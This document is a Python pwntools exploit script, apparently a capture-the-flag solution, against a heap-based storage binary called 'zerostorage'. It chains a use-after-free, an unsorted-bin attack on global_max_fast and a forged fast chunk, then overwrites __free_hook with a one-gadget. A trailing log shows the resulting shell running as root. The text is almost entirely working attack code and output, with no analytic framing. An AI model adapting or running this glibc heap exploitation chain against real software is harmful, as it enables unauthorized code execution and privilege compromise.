from pwn import *
r=process('./zerostorage')
global_m_fast=0x7ffff7dd5b40-0x00007ffff7a15000
unsorted_off=0x00007fe824c577b8-0x00007fe824899000
free_hook=0x00000000003c0a10
system=0x0000000000046640
pie=0x00007fe03b8c0000-0x00007fe03b2d6000
def insert(data):
    r.recvuntil('choice: ')
    r.sendline('1')
    r.sendline(str(len(data)+1))
    r.sendline(data)

def merge(f,t):
    r.recvuntil('choice')
    r.sendline('3')
    r.sendline(str(f))
    r.sendline(str(t))

def update(idx,data):
    r.recvuntil('choice: ')
    r.sendline('2')
    r.sendline(str(idx))
    r.sendline(str(len(data)))
    r.send(data)

def delete(id):
    r.recvuntil('choice: ')
    r.sendline('4')
    r.sendline(str(id))

def view(id):
    r.recvuntil('choice: ')
    r.sendline('5')
    r.sendline(str(id))

def list():
    r.recvuntil('choice: ')
    r.sendline('6')

insert('AAAAAAAA')#0
insert('BBBBBBBB')#1
insert('CCCCCCCC')#2
insert('DDDDDDDD')#3
insert('EEEEEEEE')#4
insert('FFFFFFFF'*18)#5
insert('GGGGGGGG')#6
delete(0)         #0 unuse
merge(2,2)        #0(UAF),2 unuse
view(0)#leak libc and heap simultaneously
r.recvuntil('Entry No.0:\n')
heap=u64(r.recvn(8))
log.info('heap='+hex(heap))
uns=u64(r.recvn(8))
libc=uns-unsorted_off
free_hook=libc+free_hook
pie=libc+pie
global_node_list=0x203060+pie
magic_gadget=libc+0x4652c
log.info('pie='+hex(pie))
log.info('free_hook='+hex(free_hook))
log.info('lib_base='+hex(uns-unsorted_off))
log.info('global_node_list='+hex(global_node_list))
gmf=libc+global_m_fast
log.info('&global_max_fast='+hex(gmf))
insert('xxxxxxxx')#get the first free chunk (idx 2) 
update(0,'a'*8+p64(gmf-0x10))#fake unsorted_bin chunk
insert('evilevil')#(global_max_fast->&unsorted_bin) now g_m_f has been overwrited (idx 7)
merge(4,4)#uaf(8)
update(8,p64(global_node_list+5*8*3))#fake "fast chunk"
insert("aaaaaaaa")#idx 4
insert("B"*(0x5e+12))#get the fake "fast chunk" (idx 9) points to idx 5
view(9)#
r.recvuntil('Entry No.9:\n')
xor_addr=u64(r.recvn(0x68)[0x60:0x68])
rand_key=xor_addr^(global_node_list+0x8*3*5+0x10)
log.info('rand_key='+hex(rand_key))
log.info('magic_gadget='+hex(magic_gadget))
update(9,'JUNKJUNK'+p64(1)+p64(0x8)+p64(rand_key^free_hook))
#         padding    inUse  size=8        
update(6,p64(magic_gadget))
#            size==8
delete(6)
r.interactive()
'''
[+] Starting program './zerostorage': Done
[*] heap=0x7f87a9011000
[*] pie=0x7f87a7924000
[*] free_hook=0x7f87a76faa10
[*] lib_base=0x7f87a733a000
[*] global_node_list=0x7f87a7b27060
[*] &global_max_fast=0x7f87a76fab40
[*] rand_key=0xeb599987228b4525
[*] magic_gadget=0x7f87a738052c
[*] Switching to interactive mode
Entry ID: $ id
uid=0(root) gid=0(root) groups=0(root)
$
'''
